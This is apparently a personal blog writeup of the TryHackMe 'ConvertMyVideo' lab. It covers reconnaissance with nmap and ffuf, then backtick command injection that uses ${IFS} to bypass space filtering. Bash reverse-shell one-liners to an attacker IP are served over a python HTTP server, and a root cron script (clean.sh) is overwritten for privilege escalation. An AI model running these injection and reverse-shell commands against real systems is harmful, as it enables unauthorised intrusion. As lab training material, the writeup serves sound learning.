---
title: "ConvertMyVideo - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - ConvertMyVideo
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - thm
  - tryhackme
  - machine
  - medium
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## ConvertMyVideo
![](https://kar0nx.github.io/assets/images/writeup/44f87b4bb655d754fc1f8bc6223d06d7.png)

## Reconnaissance

IP: 10.10.169.64
### NMAP

```
nmap -T4 -A -p- 10.10.169.64
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 10:20 EST
Nmap scan report for 10.10.169.64
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/28%OT=22%CT=1%CU=43657%PV=Y%DS=2%DC=T%G=Y%TM=67C1
OS:D476%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508S
OS:T11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)E
OS:CN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   43.64 ms 10.11.0.1
2   43.89 ms 10.10.169.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.53 seconds
```

Nmap shows 2 open ports 22 ssh and 80 http on Apache httpd 2.4.29
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228162243.png)

only convert options on site, nothing special in source code, try ffuf.

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.169.64/FUZZ  

-admin
-js
-images
-tmp
```

To access admin page we need credentials, so let's back to home page and try with Burp Suite.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228164516.png)

Looks like the website sending request to server. Let's try some kind of injections. 
Backtick works with id, ls command.
## Gaining Access

I made simple reverse shell on attacking machine https://www.revshells.com/ and tried to send in to server.

```
echo bash -i >& /dev/tcp/10.11.129.113/1337 0>&1 > rbash.sh
```

and host it via python server

```
python3 -m http.server 80
```

Trying to send it in burpsuit (website doesn't like spaces and special characters), so we need to find way to replace them. Space  = ${IFS} https://www.baeldung.com/linux/ifs-shell-variable

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228171014.png)

It seems to work, start netcat and continue with commands:
```
`chmod${IFS}777${IFS}rbash.sh`

`bash${IFS}rbash.sh`
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228171357.png)

We have low priv access, grab first flag.

```
cat admin/flag.txt
```

## Privilege Escalation

There is no "easy wins" after scanning with linpeas

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228174715.png)

But there is interesting process running by root
Let's use PsPy to have a better view.
https://github.com/DominicBreuker/pspy?tab=readme-ov-file
again host python simple server in pspy64 directory
On target machine:

```
wget http://10.11.129.113/pspy64
chmod +x pspy64
./pspy64
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228175426.png)

now we know that script clean.sh is executing every 1 minute. Let's overwrite it. To start we must stop pspy64 and restart reverse shell. 
Navigate to /var/www/html/tmp and type:

```
echo "bash -i >& /dev/tcp/10.11.129.113/1338 0>&1" > clean.sh
```

simple bash one liner, start nc in new tab

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250228180042.png)

And we have root access.
Grab last flag in /root/root.txt